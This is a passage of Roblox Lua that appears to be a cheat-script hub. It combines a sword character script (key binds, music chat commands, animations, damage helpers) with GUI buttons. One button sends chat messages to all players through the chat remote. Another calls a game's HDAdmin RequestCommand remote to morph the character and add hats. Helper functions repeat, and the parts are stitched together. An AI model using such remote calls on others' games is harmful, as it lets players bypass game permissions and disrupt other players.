	equip()
elseif k == "f" and attack == false and equipped == true then
	maybe:FindFirstChildOfClass("AlignOrientation").Attachment1 = playerss.Torso.WaistBackAttachment
    maybe:FindFirstChildOfClass("AlignPosition").Attachment1 = playerss.Torso.WaistBackAttachment

    playerss.Torso.WaistBackAttachment.Position = Vector3.new(-0, -0, 0.6)
    playerss.Torso.WaistBackAttachment.Orientation = Vector3.new(-4.16, -179.28, 99.8)
   unequip()
end
if k == "r" and attack == false then
superjump()
end
if k == "v" and attack == false then
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
g1.CFrame = CFrame.new(playerss:FindFirstChild("HumanoidRootPart").Position,mouse.Hit.p)
game:GetService("Debris"):AddItem(g1,.05)
playerss:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(mouse.Hit.p) * CFrame.new(0,3.3,0)
end
if equipped == true then
if k == "z" and attack == false then
spinnyblade()
end
if k == "x" and attack == false then
eightbitmegablade()
end
if k == "c" and attack == false then
bladespinagain()
end
end
if k == "l" and muter == false then
muter = true
kan.Volume = 0
elseif k == "l" and muter == true then
muter = false
if not NoSound then
	kan.Volume = 1.25
end
end
end)
plr.Chatted:connect(function(message)
if message:sub(1,3) == "id/" then
ORGID = message:sub(4)
kan.TimePosition = 0
kan:Play()
elseif message:sub(1,6) == "pitch/" then
ORPIT = message:sub(7)
elseif message:sub(1,4) == "vol/" then
ORVOL = message:sub(5)
elseif message:sub(1,7) == "skipto/" then
kan.TimePosition = message:sub(8)
end
end)

idleanim=.4
while true do
swait()
if muter == false then
if not NoSound then
	kan.Volume = ORVOL
end
else
kan.Volume = 0
end
kan.PlaybackSpeed = ORPIT
kan.Pitch = ORPIT
kan.SoundId = "rbxassetid://" ..ORGID
kan.Looped = true
kan.Parent = char
kan:Resume()
  sine = sine + change
local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude 
local velderp=RootPart.Velocity.y
hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Character)
if equipped==true or equipped==false then
if attack==false then
idle=idle+1
else
idle=0
end
if idle>=500 then
if attack==false then
--Sheath()
end
end
if RootPart.Velocity.y > 1 and hitfloor==nil then 
Anim="Jump"
if attack==false then
RH.C0=clerp(RH.C0,cf(1,-0.35 - 0.05 * math.cos(sine / 25),-0.75)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(-20)),.1)
LH.C0=clerp(LH.C0,cf(-1,-1 - 0.05 * math.cos(sine / 25),0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(20)),.1)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0 + 0.05 * math.cos(sine / 25))*angles(math.rad(-tors.Velocity.Y/6),math.rad(0),math.rad(0)),.1)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-2.5),math.rad(0),math.rad(0)),.1)
RW.C0=clerp(RW.C0,cf(1.45,0.5 + 0.1 * math.cos(sine / 25),0)*angles(math.rad(-5),math.rad(0),math.rad(25)),.1)
LW.C0=clerp(LW.C0,cf(-1.45,0.5 + 0.1 * math.cos(sine / 25),0)*angles(math.rad(-5),math.rad(0),math.rad(-25)),.1)
if equipped == false then
weaponweld.C1=clerp(weaponweld.C1,cf(-3,0,-0.5)*angles(math.rad(0),math.rad(0),math.rad(-40)),.3)
else
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(130),math.rad(0)),.3)
end
end
elseif RootPart.Velocity.y < -1 and hitfloor==nil then 
Anim="Fall"
if attack==false then
RH.C0=clerp(RH.C0,cf(1,-0.35 - 0.05 * math.cos(sine / 25),-0.75)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(-20)),.1)
LH.C0=clerp(LH.C0,cf(-1,-1 - 0.05 * math.cos(sine / 25),0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(20)),.1)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0 + 0.05 * math.cos(sine / 25))*angles(math.rad(-tors.Velocity.Y/6),math.rad(0),math.rad(0)),.1)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(2.5),math.rad(0),math.rad(0)),.1)
RW.C0=clerp(RW.C0,cf(1.45,0.5 + 0.1 * math.cos(sine / 25),0)*angles(math.rad(-15),math.rad(0),math.rad(55)),.1)
LW.C0=clerp(LW.C0,cf(-1.45,0.5 + 0.1 * math.cos(sine / 25),0)*angles(math.rad(-15),math.rad(0),math.rad(-55)),.1)
if equipped == false then
weaponweld.C1=clerp(weaponweld.C1,cf(-3,0,-0.5)*angles(math.rad(0),math.rad(0),math.rad(-40)),.3)
else
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(130),math.rad(0)),.3)
end
end
elseif torvel<1 and hitfloor~=nil then
Anim="Idle"
if attack==false then
if equipped == false then
RH.C0=clerp(RH.C0,cf(1,-1 + 0.05 * math.cos(sine / 20)  - 0.02 * math.cos(sine / 40),0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3 + 2 * math.cos(sine / 40)),math.rad(-15),math.rad(0 + 2 * math.cos(sine / 20))),.1)
LH.C0=clerp(LH.C0,cf(-1,-1 + 0.05 * math.cos(sine / 20) - 0.02 * math.cos(sine / 40),0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3 - 2 * math.cos(sine / 40)),math.rad(1),math.rad(0 - 2 * math.cos(sine / 20))),.1)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0 + 0.02 * math.cos(sine / 40),0 - 0.02 * math.cos(sine / 40),-0.05 - 0.05 * math.cos(sine / 20))*angles(math.rad(0 + 2 * math.cos(sine / 20)),math.rad(0 + 2 * math.cos(sine / 40)),math.rad(30 + 3 * math.cos(sine / 40))),.1)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(2),math.rad(0 - 7 * math.cos(sine / 40)),math.rad(-30 - 3 * math.cos(sine / 40))),.1)
RW.C0=clerp(RW.C0,cf(1.45,0.5 + 0.05 * math.cos(sine / 28),0.1)*angles(math.rad(-6 + 5 * math.cos(sine / 26)),math.rad(-10 - 6 * math.cos(sine / 24)),math.rad(13 - 5 * math.cos(sine / 34))),.1)
LW.C0=clerp(LW.C0,cf(-1.4,0.5 + 0.05 * math.cos(sine / 28),0.1)*angles(math.rad(-13 - 1 * math.cos(sine / 25)),math.rad(10 + 2 * math.cos(sine / 24)),math.rad(10 + 2 * math.cos(sine / 34))),.1)
weaponweld.C1=clerp(weaponweld.C1,cf(-3,0,-0.5)*angles(math.rad(0),math.rad(0),math.rad(-40)),.3)
else
RH.C0=clerp(RH.C0,cf(1,-1 + 0.05 * math.cos(sine / 20)  - 0.02 * math.cos(sine / 40),0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3 + 2 * math.cos(sine / 40)),math.rad(0 - 6 * math.cos(sine / 40)),math.rad(-6 + 2 * math.cos(sine / 20) - 6 * math.cos(sine / 40))),.1)
LH.C0=clerp(LH.C0,cf(-1,-1 + 0.05 * math.cos(sine / 20) - 0.02 * math.cos(sine / 40),0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3 - 2 * math.cos(sine / 40)),math.rad(10 - 6 * math.cos(sine / 40)),math.rad(3 - 2 * math.cos(sine / 20) - 3 * math.cos(sine / 40))),.1)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0 + 0.02 * math.cos(sine / 40),0 - 0.06 * math.cos(sine / 40),-0.05 - 0.05 * math.cos(sine / 20))*angles(math.rad(0 + 2 * math.cos(sine / 20)),math.rad(0 + 2 * math.cos(sine / 40)),math.rad(-20 + 6 * math.cos(sine / 40))),.1)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(6),math.rad(0 - 2 * math.cos(sine / 42)),math.rad(20 - 6 * math.cos(sine / 40))),.1)
RW.C0=clerp(RW.C0,cf(1.45,0.5 + 0.05 * math.cos(sine / 28),0.1)*angles(math.rad(-13 + 3 * math.cos(sine / 26)),math.rad(-20 - 3 * math.cos(sine / 24)),math.rad(20 - 5 * math.cos(sine / 34))),.1)
LW.C0=clerp(LW.C0,cf(-1.45,0.5 + 0.05 * math.cos(sine / 28),0.1)*angles(math.rad(-13 - 3 * math.cos(sine / 25)),math.rad(10 + 3 * math.cos(sine / 24)),math.rad(-10 + 5 * math.cos(sine / 34))),.1)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(130),math.rad(0)),.3)
end
end
elseif torvel>2 and torvel<42 and hitfloor~=nil then
Anim="Walk"
if attack==false then
if equipped == false then
RH.C0=clerp(RH.C0,cf(1,-1 + 0.05 * math.cos(sine / 4),0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(0 + 5 * math.cos(sine / 8)),math.rad(0 + 45 * math.cos(sine / 8))),.1)
LH.C0=clerp(LH.C0,cf(-1,-1 + 0.05 * math.cos(sine / 4),0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(0 + 5 * math.cos(sine / 8)),math.rad(0 + 45 * math.cos(sine / 8))),.1)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,-0.05,-0.05 + 0.05 * math.cos(sine / 4))*angles(math.rad(5 + 3 * math.cos(sine / 4)),math.rad(0 + root.RotVelocity.Y/1.5),math.rad(0 - root.RotVelocity.Y - 10 * math.cos(sine / 8))),.1)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-5 - 5 * math.cos(sine / 4)),math.rad(0 + root.RotVelocity.Y/1.5),math.rad(0 - hed.RotVelocity.Y*1.5 + 10 * math.cos(sine / 8))),.1)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0 + 0.25 * math.cos(sine / 8))*angles(math.rad(0 - 50 * math.cos(sine / 8)),math.rad(0),math.rad(5 - 10 * math.cos(sine / 4))),.1)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0 - 0.25 * math.cos(sine / 8))*angles(math.rad(0 + 50 * math.cos(sine / 8)),math.rad(0),math.rad(-5 + 10 * math.cos(sine / 4))),.1)
weaponweld.C1=clerp(weaponweld.C1,cf(-3,0,-0.5)*angles(math.rad(0),math.rad(0),math.rad(-40)),.3)
else
RH.C0=clerp(RH.C0,cf(1,-1 + 0.05 * math.cos(sine / 4),0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(0 + 5 * math.cos(sine / 8)),math.rad(0 + 60 * math.cos(sine / 8))),.1)
LH.C0=clerp(LH.C0,cf(-1,-1 + 0.05 * math.cos(sine / 4),0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(0 + 5 * math.cos(sine / 8)),math.rad(0 + 60 * math.cos(sine / 8))),.1)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,-0.05,0 + 0.15 * math.cos(sine / 4))*angles(math.rad(10 - 3 * math.cos(sine / 4)),math.rad(0 + root.RotVelocity.Y/1.5),math.rad(-10 - root.RotVelocity.Y - 5 * math.cos(sine / 8))),.1)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(5 + 3 * math.cos(sine / 4)),math.rad(0 + root.RotVelocity.Y/1.5 + 3 * math.cos(sine / 57)),math.rad(10 - hed.RotVelocity.Y*1.5 + 5 * math.cos(sine / 8))),.1)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0 + 0.25 * math.cos(sine / 8))*angles(math.rad(-10),math.rad(0),math.rad(15 - 2 * math.cos(sine / 34))),.1)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0 - 0.25 * math.cos(sine / 8))*angles(math.rad(0 + 50 * math.cos(sine / 8)),math.rad(0),math.rad(-5 + 10 * math.cos(sine / 4))),.1)
weaponweld.C1=clerp(weaponweld.C1,cf(0,1,0)*angles(math.rad(0),math.rad(120 + 5 * math.cos(sine / 35)),math.rad(0)),.3)
end
end
elseif torvel>=42 and hitfloor~=nil then
Anim="Run"
if attack==false then
RH.C0=clerp(RH.C0,cf(1,-1 - 0.15 * math.cos(sine / 3),0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(0),math.rad(0 + 85 * math.cos(sine / 6))),.1)
LH.C0=clerp(LH.C0,cf(-1,-1 - 0.15 * math.cos(sine / 3),0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(0),math.rad(0 + 85 * math.cos(sine / 6))),.1)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,-0.3,-0.05 + 0.15 * math.cos(sine / 3))*angles(math.rad(15 - 4 * math.cos(sine / 3)),math.rad(0 + root.RotVelocity.Y*1.5),math.rad(0 - root.RotVelocity.Y - 10 * math.cos(sine / 6))),.1)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-2.5 + 4 * math.cos(sine / 3)),math.rad(0 + root.RotVelocity.Y*1.5),math.rad(0 - hed.RotVelocity.Y*1.5 + 10 * math.cos(sine / 6))),.1)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0 + 0.5 * math.cos(sine / 6))*angles(math.rad(0 - 140 * math.cos(sine / 6)),math.rad(0),math.rad(5 - 20 * math.cos(sine / 3))),.1)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0 - 0.5 * math.cos(sine / 6))*angles(math.rad(0 + 140 * math.cos(sine / 6)),math.rad(0),math.rad(-5 + 20 * math.cos(sine / 3))),.1)
end
end
end
end
------
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "???";
        Text = "DOESN'T VERIFY...";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section8:NewButton("water sword paid coming soon", "coming soon", function()
                local args = {
    [1] = "coming soon!",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewButton("Dual sword", "r6", function()
         local A_1 = ";morph me do"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";char me char"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";hat me 4506945409"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(1)
         local A_1 = ";hat me 4315489767"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
   Player=game:GetService("Players").LocalPlayer
Character=Player.Character 
PlayerGui=Player.PlayerGui
Backpack=Player.Backpack 
Torso=Character.Torso 
Head=Character.Head 
Humanoid=Character.Humanoid
m=Instance.new('Model',Character)
LeftArm=Character["Left Arm"] 
LeftLeg=Character["Left Leg"] 
RightArm=Character["Right Arm"] 
RightLeg=Character["Right Leg"] 
LS=Torso["Left Shoulder"] 
LH=Torso["Left Hip"] 
RS=Torso["Right Shoulder"] 
RH=Torso["Right Hip"] 
Face = Head.face
Neck=Torso.Neck
it=Instance.new
attacktype=1
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
cloaked=false
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
attack = false 
attackdebounce = false 
deb=false
equipped=true
hand=false
MMouse=nil
combo=0
mana=0
trispeed=.2
attackmode='none'
local idle=0
local Anim="Idle"
local Effects={}
local gun=false
local shoot=false
player=nil 
mana=0

mouse=Player:GetMouse()
--save shoulders 
RSH, LSH=nil, nil 
--welds 
RW, LW=Instance.new("Weld"), Instance.new("Weld") 
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
LH=Torso["Left Hip"]
RH=Torso["Right Hip"]
TorsoColor=Torso.BrickColor
function NoOutline(Part)
Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end
player=Player 
ch=Character
RSH=ch.Torso["Right Shoulder"] 
LSH=ch.Torso["Left Shoulder"] 
-- 
RSH.Parent=nil 
LSH.Parent=nil 
-- 
RW.Name="Right Shoulder"
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch["Right Arm"] 
RW.Parent=ch.Torso 
-- 
LW.Name="Left Shoulder"
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch["Left Arm"] 
LW.Parent=ch.Torso 

	Player=game:GetService('Players').LocalPlayer
	Character=Player.Character
	Mouse=Player:GetMouse()
	m=Instance.new('Model',Character)


	local function weldBetween(a, b)
	    local weldd = Instance.new("ManualWeld")
	    weldd.Part0 = a
	    weldd.Part1 = b
	    weldd.C0 = CFrame.new()
	    weldd.C1 = b.CFrame:inverse() * a.CFrame
	    weldd.Parent = a
	    return weldd
	end
	
	it=Instance.new
	
	function nooutline(part)
		part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
	end
	
	function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
		local fp=it("Part")
		fp.formFactor=formfactor
		fp.Parent=parent
		fp.Reflectance=reflectance
		fp.Transparency=transparency
		fp.CanCollide=false
		fp.Locked=true
		fp.BrickColor=BrickColor.new(tostring(brickcolor))
		fp.Name=name
		fp.Size=size
		fp.Position=Character.Torso.Position
		nooutline(fp)
		fp.Material=material
		fp:BreakJoints()
		return fp
	end
	
	function mesh(Mesh,part,meshtype,meshid,offset,scale)
		local mesh=it(Mesh)
		mesh.Parent=part
		if Mesh=="SpecialMesh" then
			mesh.MeshType=meshtype
			mesh.MeshId=meshid
		end
		mesh.Offset=offset
		mesh.Scale=scale
		return mesh
	end
	
	function weld(parent,part0,part1,c0,c1)
		local weld=it("Weld")
		weld.Parent=parent
		weld.Part0=part0
		weld.Part1=part1
		weld.C0=c0
		weld.C1=c1
		return weld
	end    


    Player=game:GetService('Players').LocalPlayer
	Character=Player.Character
	Mouse=Player:GetMouse()
	m=Instance.new('Model',Character)


	local function weldBetween(a, b)
	    local weldd = Instance.new("ManualWeld")
	    weldd.Part0 = a
	    weldd.Part1 = b
	    weldd.C0 = CFrame.new()
	    weldd.C1 = b.CFrame:inverse() * a.CFrame
	    weldd.Parent = a
	    return weldd
	end
	
	it=Instance.new
	
	function nooutline(part)
		part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
	end
	
	function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
		local fp=it("Part")
		fp.formFactor=formfactor
		fp.Parent=parent
		fp.Reflectance=reflectance
		fp.Transparency=transparency
		fp.CanCollide=false
		fp.Locked=true
		fp.BrickColor=BrickColor.new(tostring(brickcolor))
		fp.Name=name
		fp.Size=size
		fp.Position=Character.Torso.Position
		nooutline(fp)
		fp.Material=material
		fp:BreakJoints()
		return fp
	end
	
	function swait(num)
    if num==0 or num==nil then
    game:service'RunService'.Stepped:wait(0)
    else
    for i=0,num do
    game:service'RunService'.Stepped:wait(0)
    end
    end
    end
	
	function mesh(Mesh,part,meshtype,meshid,offset,scale)
		local mesh=it(Mesh)
		mesh.Parent=part
		if Mesh=="SpecialMesh" then
			mesh.MeshType=meshtype
			mesh.MeshId=meshid
		end
		mesh.Offset=offset
		mesh.Scale=scale
		return mesh
	end
	
	function weld(parent,part0,part1,c0,c1)
		local weld=it("Weld")
		weld.Parent=parent
		weld.Part0=part0
		weld.Part1=part1
		weld.C0=c0
		weld.C1=c1
		return weld
	end
	
	
local function CFrameFromTopBack(at, top, back)
local right = top:Cross(back)
return CFrame.new(at.x, at.y, at.z,
right.x, top.x, back.x,
right.y, top.y, back.y,
right.z, top.z, back.z)
end

function Triangle(a, b, c)
local edg1 = (c-a):Dot((b-a).unit)
local edg2 = (a-b):Dot((c-b).unit)
local edg3 = (b-c):Dot((a-c).unit)
if edg1 <= (b-a).magnitude and edg1 >= 0 then
a, b, c = a, b, c
elseif edg2 <= (c-b).magnitude and edg2 >= 0 then
a, b, c = b, c, a
elseif edg3 <= (a-c).magnitude and edg3 >= 0 then
a, b, c = c, a, b
else
assert(false, "unreachable")
end
 
local len1 = (c-a):Dot((b-a).unit)
local len2 = (b-a).magnitude - len1
local width = (a + (b-a).unit*len1 - c).magnitude
 
local maincf = CFrameFromTopBack(a, (b-a):Cross(c-b).unit, -(b-a).unit)
 
local list = {}

local Color = BrickColor.new("Really black")
 
if len1 > 0.01 then
local w1 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w1,5)
w1.Material = "SmoothPlastic"
w1.FormFactor = 'Custom'
w1.BrickColor = BrickColor.new(Color)
w1.Transparency = 0
w1.Reflectance = 0
w1.Material = "SmoothPlastic"
w1.CanCollide = false
NoOutline(w1)
local sz = Vector3.new(0.2, width, len1)
w1.Size = sz
local sp = Instance.new("SpecialMesh",w1)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w1.Size
w1:BreakJoints()
w1.Anchored = true
w1.Parent = workspace
w1.Transparency = 0.7
table.insert(Effects,{w1,"Disappear",.01})
w1.CFrame = maincf*CFrame.Angles(math.pi,0,math.pi/2)*CFrame.new(0,width/2,len1/2)
table.insert(list,w1)
end
 
if len2 > 0.01 then
local w2 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w2,5)
w2.Material = "SmoothPlastic"
w2.FormFactor = 'Custom'
w2.BrickColor = BrickColor.new(Color)
w2.Transparency = 0
w2.Reflectance = 0
w2.Material = "SmoothPlastic"
w2.CanCollide = false
NoOutline(w2)
local sz = Vector3.new(0.2, width, len2)
w2.Size = sz
local sp = Instance.new("SpecialMesh",w2)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w2.Size
w2:BreakJoints()
w2.Anchored = true
w2.Parent = workspace
w2.Transparency = 0.7
table.insert(Effects,{w2,"Disappear",.01})
w2.CFrame = maincf*CFrame.Angles(math.pi,math.pi,-math.pi/2)*CFrame.new(0,width/2,-len1 - len2/2)
table.insert(list,w2)
end
return unpack(list)
end
	
	
so = function(id,par,vol,pit) 
coroutine.resume(coroutine.create(function()
local sou = Instance.new("Sound",par or workspace)
sou.Volume=vol
sou.Pitch=pit or 1
sou.SoundId=id
swait() 
sou:play() 
game:GetService("Debris"):AddItem(sou,6)
end))
end
 
function clerp(a,b,t) 
local qa = {QuaternionFromCFrame(a)}
local qb = {QuaternionFromCFrame(b)} 
local ax, ay, az = a.x, a.y, a.z 
local bx, by, bz = b.x, b.y, b.z
local _t = 1-t
return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 
 
function QuaternionFromCFrame(cf) 
local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
local trace = m00 + m11 + m22 
if trace > 0 then 
local s = math.sqrt(1 + trace) 
local recip = 0.5/s 
return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
else 
local i = 0 
if m11 > m00 then
i = 1
end
if m22 > (i == 0 and m00 or m11) then 
i = 2 
end 
if i == 0 then 
local s = math.sqrt(m00-m11-m22+1) 
local recip = 0.5/s 
return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
elseif i == 1 then 
local s = math.sqrt(m11-m22-m00+1) 
local recip = 0.5/s 
return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
elseif i == 2 then 
local s = math.sqrt(m22-m00-m11+1) 
local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
end 
end 
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w) 
local xs, ys, zs = x + x, y + y, z + z 
local wx, wy, wz = w*xs, w*ys, w*zs 
local xx = x*xs 
local xy = x*ys 
local xz = x*zs 
local yy = y*ys 
local yz = y*zs 
local zz = z*zs 
return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end
 
function QuaternionSlerp(a, b, t) 
local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
local startInterp, finishInterp; 
if cosTheta >= 0.0001 then 
if (1 - cosTheta) > 0.0001 then 
local theta = math.acos(cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((1-t)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta  
else 
startInterp = 1-t 
finishInterp = t 
end 
else 
if (1+cosTheta) > 0.0001 then 
local theta = math.acos(-cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((t-1)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta 
else 
startInterp = t-1 
finishInterp = t 
end 
end 
return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end

function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

local function CFrameFromTopBack(at, top, back)
local right = top:Cross(back)
return CFrame.new(at.x, at.y, at.z,
right.x, top.x, back.x,
right.y, top.y, back.y,
right.z, top.z, back.z)
end

function Triangle(a, b, c)
local edg1 = (c-a):Dot((b-a).unit)
local edg2 = (a-b):Dot((c-b).unit)
local edg3 = (b-c):Dot((a-c).unit)
if edg1 <= (b-a).magnitude and edg1 >= 0 then
a, b, c = a, b, c
elseif edg2 <= (c-b).magnitude and edg2 >= 0 then
a, b, c = b, c, a
elseif edg3 <= (a-c).magnitude and edg3 >= 0 then
a, b, c = c, a, b
else
assert(false, "unreachable")
end
 
local len1 = (c-a):Dot((b-a).unit)
local len2 = (b-a).magnitude - len1
local width = (a + (b-a).unit*len1 - c).magnitude
 
local maincf = CFrameFromTopBack(a, (b-a):Cross(c-b).unit, -(b-a).unit)
 
local list = {}
 
if len1 > 0.01 then
local w1 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w1,5)
w1.Material = "SmoothPlastic"
w1.FormFactor = 'Custom'
w1.BrickColor = BrickColor.new("Dark stone grey")
w1.Transparency = 0
w1.Reflectance = 0
w1.Material = "SmoothPlastic"
w1.CanCollide = false
NoOutline(w1)
local sz = Vector3.new(0.2, width, len1)
w1.Size = sz
local sp = Instance.new("SpecialMesh",w1)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w1.Size
w1:BreakJoints()
w1.Anchored = true
w1.Parent = workspace
w1.Transparency = 0.7
table.insert(Effects,{w1,"Disappear",.01})
w1.CFrame = maincf*CFrame.Angles(math.pi,0,math.pi/2)*CFrame.new(0,width/2,len1/2)
table.insert(list,w1)
end
 
if len2 > 0.01 then
local w2 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w2,5)
w2.Material = "SmoothPlastic"
w2.FormFactor = 'Custom'
w2.BrickColor = BrickColor.new("Dark stone grey")
w2.Transparency = 0
w2.Reflectance = 0
w2.Material = "SmoothPlastic"
w2.CanCollide = false
NoOutline(w2)
local sz = Vector3.new(0.2, width, len2)
w2.Size = sz
local sp = Instance.new("SpecialMesh",w2)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w2.Size
w2:BreakJoints()
w2.Anchored = true
w2.Parent = workspace
w2.Transparency = 0.7
table.insert(Effects,{w2,"Disappear",.01})
w2.CFrame = maincf*CFrame.Angles(math.pi,math.pi,-math.pi/2)*CFrame.new(0,width/2,-len1 - len2/2)
table.insert(list,w2)
end
return unpack(list)
end

Damagefunc=function(hit,minim,maxim,knockback,Type,Property,Delay,KnockbackType,decreaseblock)
        if hit.Parent==nil then
                return
        end
        h=hit.Parent:FindFirstChild("Humanoid")
        for _,v in pairs(hit.Parent:children()) do
        if v:IsA("Humanoid") then
        h=v
        end
        end
        if hit.Parent.Parent:FindFirstChild("Torso")~=nil then
        h=hit.Parent.Parent:FindFirstChild("Humanoid")
        end
        if hit.Parent.className=="Hat" then
        hit=hit.Parent.Parent:findFirstChild("Head")
        end
        if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild("Torso")~=nil then
